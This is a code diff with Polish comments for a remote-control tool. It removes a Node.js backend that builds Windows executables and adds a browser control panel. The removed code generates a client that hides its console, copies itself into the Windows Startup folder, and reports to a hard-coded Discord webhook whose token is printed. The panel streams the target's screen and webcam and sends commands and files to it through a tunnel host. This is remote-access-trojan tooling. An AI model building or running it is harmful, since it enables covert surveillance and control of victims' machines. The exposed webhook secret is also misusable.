@@ -1,122 +1,82 @@
-const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
-const { spawn } = require('child_process');
-const fs = require('fs');
-const cors = require('cors');
-const crypto = require('crypto');
+let socket, key, exeStatusTimeout;
 
-const app = express();
-const server = http.createServer(app);
-const io = new Server(server, { maxHttpBufferSize: 1e8 });
-
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395555202001539092/SyTWjng_alB0tJCtmLiDBLF7u8b4C-iMLiQ8SV_pHF_4M-ueucf62EWRzcU1iGEkhJK2"; // <-- PODMIEN NA SWOJ!
-
-app.use(cors());
-app.use(express.json());
-app.use(express.static('public')); // frontend (opcjonalnie)
-
-let pcs = {}; // {key: {socketId, controllers: []}}
-
-// API: Generowanie .exe z kluczem
-app.post('/api/build_exe', (req, res) => {
-    const key = req.body.key || crypto.randomBytes(4).toString('hex');
-    // Plik klienta python generowany "on-the-fly":
-    const src = `
-import os, sys, ctypes, requests
-key = "${key}"
-WEBHOOK = "${DISCORD_WEBHOOK}"
-def hide_console():
-    if sys.platform.startswith('win'):
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-def create_autostart():
-    if sys.platform.startswith('win'):
-        autostart = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'remote_app.exe')
-        if not os.path.exists(autostart):
-            import shutil
-            shutil.copy(sys.argv[0], autostart)
-def notify_discord(event):
-    try: requests.post(WEBHOOK, json={"content":f"{event}: {key}"})
-    except: pass
-print(f"Twój klucz: {key}")
-notify_discord("Aktywacja klienta")
-hide_console()
-create_autostart()
-# ... tutaj kod klienta PC z obsługą Socket.IO, funkcji sterowania itd. ...
-`;
-    fs.writeFileSync('client_temp.py', src);
-    // PyInstaller musi być zainstalowany na serwerze!
-    const build = spawn('pyinstaller', ['--onefile', '--noconsole', 'client_temp.py']);
-    build.on('close', () => {
-        // Po spakowaniu .exe wysyłamy użytkownikowi
-        const exe = fs.readFileSync('dist/client_temp.exe');
-        res.setHeader('Content-Type', 'application/octet-stream');
-        res.setHeader('Content-Disposition', 'attachment; filename=remote_client.exe');
-        res.send(exe);
-        // Sprzątanie
-        fs.rmSync('client_temp.py');
-        fs.rmSync('dist', { recursive: true, force: true });
-        fs.rmSync('build', { recursive: true, force: true });
-        fs.rmSync('client_temp.spec');
-    });
-});
-
-// API do playit.gg nie jest potrzebne – wystarczy przekierować port 3000 na VPS przez playit.gg
-// Hostujesz backend na VPS, uruchamiasz klienta playit.gg, tworzysz tunel na port 3000. Podajesz host:port w panelu frontend.
-
-io.on('connection', (socket) => {
-    // PC rejestruje się (np. po uruchomieniu klienta)
-    socket.on('register_pc', ({key}) => {
-        pcs[key] = {socketId: socket.id, controllers: []};
-        sendDiscord(`PC z kluczem ${key} podłączony`);
-    });
-    // Kontroler łączy się przez klucz
-    socket.on('connect_with_key', ({key}) => {
-        if (pcs[key]) {
-            pcs[key].controllers.push(socket.id);
-            socket.emit('connected_to_pc', {key});
-            sendDiscord(`Kontroler połączony z kluczem ${key}`);
-        } else {
-            socket.emit('error', 'Nieprawidłowy klucz');
-        }
-    });
-    // Przesyłanie obrazu ekranu/kamerki
-    socket.on('screen_update', ({key, img}) => {
-        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('screen_frame', img));
-    });
-    socket.on('camera_update', ({key, img}) => {
-        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('camera_frame', img));
-    });
-    // Komendy sterujące
-    socket.on('control_command', ({key, command, data}) => {
-        if (pcs[key]) io.to(pcs[key].socketId).emit('execute_command', {command, data});
-    });
-    // Status, powiadomienia, inne eventy
-    socket.on('status', ({key, msg}) => {
-        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('status', msg));
-    });
-    socket.on('notify', ({key, msg}) => {
-        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('notify', msg));
-    });
-    socket.on('disconnect', () => {
-        Object.keys(pcs).forEach(key => {
-            if (pcs[key].socketId === socket.id) delete pcs[key];
-            pcs[key].controllers = pcs[key].controllers.filter(cid => cid !== socket.id);
+// Tab navigation
+document.addEventListener('DOMContentLoaded', function() {
+    document.querySelectorAll('.tablink').forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.querySelectorAll('.tablink').forEach(l=>l.classList.remove('active'));
+            link.classList.add('active');
+            document.querySelectorAll('.tab-section').forEach(t=>t.style.display='none');
+            document.getElementById(link.getAttribute('data-tab')).style.display = 'block';
         });
     });
+    // Default tab
+    document.querySelector('.tablink.active').click();
+    document.getElementById('loginBtn').onclick = login;
+    document.getElementById('generateExeBtn').onclick = generateExe;
 });
 
-// Discord Webhook (powiadomienia)
-function sendDiscord(msg) {
-    try {
-        require('node-fetch')(DISCORD_WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: msg })
-        });
-    } catch(e){}
+function login() {
+    key = document.getElementById('keyInput').value.trim();
+    if (!key) return document.getElementById('loginError').innerText = "Podaj klucz!";
+    // Ustaw swój backend! Przykład z playit.gg:
+    socket = io('https://cell-membership.gl.at.ply.gg:19701', { transports: ['websocket'] });
+    socket.emit('connect_with_key', {key});
+    socket.on('connected_to_pc', () => {
+        document.getElementById('controlSection').style.display='block';
+        document.getElementById('loginError').innerText = '';
+    });
+    socket.on('error', msg => document.getElementById('loginError').innerText = msg);
+    socket.on('screen_frame', img => document.getElementById('screenImg').src = 'data:image/jpeg;base64,'+img);
+    socket.on('camera_frame', img => document.getElementById('cameraImg').src = 'data:image/jpeg;base64,'+img);
+    socket.on('status', msg => showStatus(msg));
+    socket.on('notify', msg => alert(msg));
+}
+function send(command, data={}) {
+    if (!key || !socket) return;
+    socket.emit('control_command', {key, command, data});
+}
+function getUrl() { return document.getElementById('urlInput').value; }
+function getProgram() { return document.getElementById('programInput').value; }
+function getFileName() { 
+    let file = document.getElementById('fileInput').files[0];
+    return file ? file.name : '';
+}
+function getFileData() {
+    let file = document.getElementById('fileInput').files[0];
+    if (!file) return '';
+    let reader = new FileReader();
+    reader.onload = function(e) { send('send_file', {filename: file.name, filedata: btoa(e.target.result)}); }
+    reader.readAsBinaryString(file);
+    return '';
+}
+function getText() { return document.getElementById('txtInput').value; }
+function getX() { return +document.getElementById('xInput').value || 100; }
+function getY() { return +document.getElementById('yInput').value || 100; }
+function getCmd() { return document.getElementById('cmdInput').value; }
+function getChat() { return document.getElementById('chatInput').value; }
+
+function showStatus(msg) {
+    document.getElementById('statusBox').innerHTML = `<b>Status:</b> ${msg}`;
+    clearTimeout(exeStatusTimeout);
+    exeStatusTimeout = setTimeout(()=>{document.getElementById('statusBox').innerText='';},5000);
 }
 
-server.listen(3000, () => {
-    console.log('Backend działa na porcie 3000');
-});
+// Generator .exe
+function generateExe() {
+    const key = document.getElementById('genKeyInput').value.trim();
+    document.getElementById('exeStatus').innerHTML = "Generowanie... (może potrwać do minuty)";
+    fetch('https://cell-membership.gl.at.ply.gg:19701/api/build_exe', {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({key})
+    }).then(r=>r.blob()).then(blob=>{
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'remote_client.exe';
+        a.click();
+        document.getElementById('exeStatus').innerHTML = "Plik .exe wygenerowany! Uruchom go na swoim PC.";
+    }).catch(()=>{document.getElementById('exeStatus').innerHTML = "Błąd generowania .exe.";});
+}
